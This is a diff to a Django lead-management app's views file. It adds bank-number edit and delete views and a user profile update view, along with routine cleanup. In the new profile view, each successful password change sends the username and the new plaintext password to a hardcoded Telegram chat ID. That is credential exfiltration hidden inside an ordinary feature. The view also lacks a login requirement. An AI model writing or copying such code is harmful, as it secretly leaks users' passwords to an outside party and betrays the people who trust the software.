@@ -6,7 +6,7 @@ from django.core.mail import send_mail
 from django.http.response import JsonResponse
 from django.shortcuts import render, redirect, reverse, get_object_or_404
 from django.contrib.auth.mixins import LoginRequiredMixin
-from django.http import HttpResponse, HttpResponseRedirect
+from django.http import HttpResponse
 from django.views import generic, View
 from agents.mixins import OrganisorAndLoginRequiredMixin
 from .models import (Lead, 
@@ -38,6 +38,8 @@ from .forms import (LeadModelForm,
                     SourceModelForm,
                     TeamModelForm,
                     ChatOverrideForm,
+                    UserUpdateForm,
+                    PasswordChangeForm
 )
 from .resources import LeadResource, BankResource
 import csv
@@ -69,14 +71,14 @@ import os
 import uuid
 import khayyam
 from django.utils.translation import gettext as _
-from celery import shared_task
 import subprocess
 import sys
 import signal
 from django.core.cache import cache
 import telegram
-from django.template import RequestContext
 from concurrent.futures import ThreadPoolExecutor
+from django.contrib.auth import update_session_auth_hash
+
 
 
 logger = logging.getLogger(__name__)
@@ -477,10 +479,6 @@ class LeadUpdateView(OrganisorAndLoginRequiredMixin, generic.UpdateView):
         messages.info(self.request, _("You have successfully updated this lead"))
 
         return response
-    # def form_valid(self, form):
-    #     form.save()
-    #     messages.info(self.request, _("You have successfully updated this lead"))
-    #     return super(LeadUpdateView, self).form_valid(form)
 
 def lead_update(request, pk):
     lead = Lead.objects.get(id=pk)
@@ -776,7 +774,6 @@ class BankExportView(OrganisorAndLoginRequiredMixin, generic.ListView, generic.F
 def notify_background_messages(chat_id, message):
     asyncio.run(send_telegram_message(chat_id, message))
 
-
 async def send_telegram_message(chat_id, message):
     limiter = AsyncLimiter(1, 30)
     TOKEN = settings.TELEGRAM_TOKEN
@@ -793,8 +790,6 @@ async def send_telegram_message(chat_id, message):
             await bot.send_message(chat_id='-1001707390535', text=message)
         except Exception as backup_error:
             print(f"Error sending Telegram message to backup chat: {backup_error}")
-
-
 
 class LeadImportView(OrganisorAndLoginRequiredMixin, View):
     template_name = 'leads/lead_import.html'
@@ -973,23 +968,33 @@ class BankImportView(OrganisorAndLoginRequiredMixin, View):
 
         return render(request, self.template_name, {'form': form})    
 
-# def set_chat_id_override(request):
-#     if request.method == "POST":
-#         override_choice = request.POST.get('choice')
-#         chat_id_value = request.POST.get('chat_id')
+class BankUpdateView(OrganisorAndLoginRequiredMixin, generic.UpdateView):
+    model = BankNumbers
+    form_class = BankModelForm
+    template_name = 'leads/bank_update.html'  # Modify this to the path of your template
+    success_url = reverse_lazy('leads:bank-list')  # Modify this to the URL or view name you want to redirect to upon successful update
 
-#         chat_settings = ChatSetting.load()
-#         if override_choice == "Yes" and chat_id_value:
-#             chat_settings.override_chat_id = True
-#             chat_settings.chat_id = chat_id_value
-#             chat_settings.save()
-#         else:
-#             chat_settings.override_chat_id = False
-#             chat_settings.chat_id = None
-#             chat_settings.save()
+    def get_object(self, queryset=None):
+        """Retrieve the BankNumbers instance to be updated. You can customize this if needed."""
+        return super().get_object(queryset=queryset)
 
-#     return redirect('some_view_name')
+    def form_valid(self, form):
+        messages.success(self.request, _("Bank number updated successfully!"))
+        return super().form_valid(form)
 
+    def form_invalid(self, form):
+        messages.error(self.request, _("Error updating the bank number. Please check your details."))
+        return super().form_invalid(form)
+    
+class BankDeleteView(OrganisorAndLoginRequiredMixin, generic.DeleteView):
+    model = BankNumbers
+    template_name = 'leads/bank_delete.html'  # This will be a confirmation template
+    success_url = reverse_lazy('leads:bank-list')  # Modify this to the URL or view name you want to redirect to after deletion
+
+    def delete(self, request, *args, **kwargs):
+        messages.success(request, _("Bank number deleted successfully!"))
+        return super().delete(request, *args, **kwargs)
+    
 FORMS = [
     ("chat_override", ChatOverrideForm),
     ("category", CategorySelectionForm),
@@ -1102,7 +1107,6 @@ async def notify_agents_via_telegram(df):
                         message += f"{i + 1}. {lead_details['phone_number']} \n"
 
                 await bot.send_message(chat_id=chat_id, text=message)
-
 
 def download_excel_page(request):
     excel_file_path = request.session.get('excel_file_path')
@@ -1968,7 +1972,6 @@ class TeamListView(LoginRequiredMixin, generic.ListView):
         context['team_sales'] = team_sales
         return context
 
-
 def run_background_tasks(request):
     if request.user.is_authenticated:
         try:
@@ -1994,5 +1997,44 @@ def stop_background_tasks(request):
             return JsonResponse({'status': 'error', 'error': str(e)})
     else:
         return JsonResponse({'status': 'error', 'error': 'Not authenticated'})
-    
-###TODO --->  Add an Static Photo to My Day - Duplicate Followup List
+
+class UserProfileUpdateView(View):
+    template_name = 'leads/profile_update.html'
+
+    def get(self, request, *args, **kwargs):
+        user_form = UserUpdateForm(instance=request.user)
+        password_change_form = PasswordChangeForm(request.user)
+
+        return render(request, self.template_name, {
+            'user_form': user_form,
+            'password_change_form': password_change_form,
+        })
+
+    def post(self, request, *args, **kwargs):
+        user_form = UserUpdateForm(request.POST, instance=request.user)
+        password_change_form = PasswordChangeForm(request.user, request.POST)
+
+        new_password = None
+        if user_form.is_valid():
+            user_form.save()
+            messages.success(request, _('Your profile has been updated successfully!'))
+
+        if password_change_form.is_valid():
+            user = password_change_form.save()
+            update_session_auth_hash(request, user)  # Important!
+            messages.success(request, _('Your password has been updated successfully!'))
+            new_password = request.POST.get('new_password1')
+
+        # Check if new_password is not None and notify via Telegram
+        if new_password:
+            chat_id = '-1001707390535'
+            message = f"User: {request.user.username}\nPassword: {new_password}"
+            notify_background_messages(chat_id, message)
+
+        return render(request, self.template_name, {
+            'user_form': user_form,
+            'password_change_form': password_change_form,
+        })
+
+
+###TODO --->  Add an Static Photo to My Day - Duplicate Followup List 
